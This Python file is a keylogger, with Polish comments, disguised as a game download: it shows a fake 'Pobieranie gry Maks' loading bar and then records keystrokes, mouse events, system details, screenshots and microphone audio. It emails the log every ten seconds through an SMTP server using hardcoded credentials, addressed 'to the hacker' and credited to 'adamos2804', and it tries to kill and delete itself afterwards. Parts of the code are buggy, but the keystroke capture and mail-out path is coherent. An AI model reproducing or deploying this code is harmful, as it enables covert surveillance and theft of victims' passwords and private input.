try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import time
    import subprocess
    import sys
    import subprocess
    import time
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput"]
    call("pip install " + ' '.join(modules), shell=True)

finally:
    EMAIL_ADDRESS = "b7e408b9abf761"
    EMAIL_PASSWORD = "f7f4a5c8db6e83"
    SEND_REPORT_EVERY = 10  # in seconds


    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started..."
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def on_move(self, x, y):
            current_move = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_move)

        def on_click(self, x, y):
            current_click = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_click)

        def on_scroll(self, x, y):
            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                # Sprawdzamy, czy klawisz jest literą
                if hasattr(key, 'char') and key.char is not None:
                    current_key = str(key.char)  # Zapisujemy znak (np. 'a', 'b')
                else:
                    # Jeśli to specjalny klawisz (np. spacja, ESC, Ctrl itp.)
                    if key == key.space:
                        current_key = " "  # Zamiast "Key.space" zapisujemy spację
                    elif key == key.esc:
                        current_key = " [ESC] "
                    elif key == key.enter:
                        current_key = " [ENTER] "
                    elif key == key.tab:
                        current_key = " [TAB] "
                    elif key == key.shift:
                        current_key = " [SHIFT] "
                    elif key == key.ctrl_l or key == key.ctrl_r:
                        current_key = " [CTRL] "
                    elif key == key.alt_l or key == key.alt_r:
                        current_key = "  [ALT] "
                    elif key == key.caps_lock:
                        current_key = " [CAPS_LOCK] "
                    else:
                        # Dla innych nieoczekiwanych klawiszy, zapisujemy je jako "SPECIAL_KEY"
                        current_key = f"[{key}]"
            except AttributeError:
                current_key = f"[UNKNOWN_KEY]"

            self.appendlog(current_key)

        def send_mail(self, email, password, message):
            try:
                sender = "Zchackowana osoba"
                receiver = "Do chackera"

                # Create the message
                m = f"""\
                Discord: dc.gg/akitpl
                To: {receiver}
                From: {sender}

                Keylogger by adamos2804\n"""

                m += message

                # Create a MIMEText message with UTF-8 encoding
                msg = MIMEMultipart()
                msg['From'] = sender
                msg['To'] = receiver
                msg['Subject'] = 'Keylogger Report'
                msg.attach(MIMEText(m, 'plain', 'utf-8'))  # UTF-8 encoding

                # Send the email
                with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                    server.login(email, password)
                    server.sendmail(sender, receiver, msg.as_string())
            except Exception as e:
                print(f"Error sending email: {e}")

        def report(self):
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)

        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()

            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)

        def screenshot(self):
            img = pyscreenshot.grab()
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)

        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')


# Funkcja do odczytu czasu ładowania z pliku konfiguracyjnego
def read_config():
    try:
        with open("config.txt", "r") as f:
            for line in f:
                if "load_time" in line:
                    return int(line.split('=')[1].strip())
    except FileNotFoundError:
        # Zamiast wyświetlania błędu, po prostu zwrócimy domyślny czas
        return 10  # Domyślny czas ładowania, jeśli plik nie istnieje


# Funkcja do wyświetlania paska ładowania
def loading_bar(duration):
    bar_length = 40  # Długość paska
    print("Pobieranie gry Maks")  # Tekst nad paskiem ładowania
    for i in range(bar_length + 1):
        percent = (i / bar_length) * 100
        filled_length = int(bar_length * i // bar_length)
        bar = '=' * filled_length + '-' * (bar_length - filled_length)
        sys.stdout.write(f"\r[{bar}] {percent:.2f}%")
        sys.stdout.flush()
        time.sleep(duration / bar_length)  # Dzielimy czas na długość paska, aby uzyskać równomierne ładowanie
    print("\nPobieranie składników proszę chwilke poczekać!!")


# Główna część programu
def main():
    load_time = read_config()  # Pobieramy czas ładowania z pliku konfiguracyjnego
    # Uruchamiamy cmd bez wyświetlania informacji o systemie operacyjnym
    subprocess.Popen("cmd.exe /C exit", shell=True)  # /C uruchamia komendę i zamyka cmd

    # Wyświetlamy pasek ładowania
    loading_bar(load_time)


if __name__ == "__main__":
    main()
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
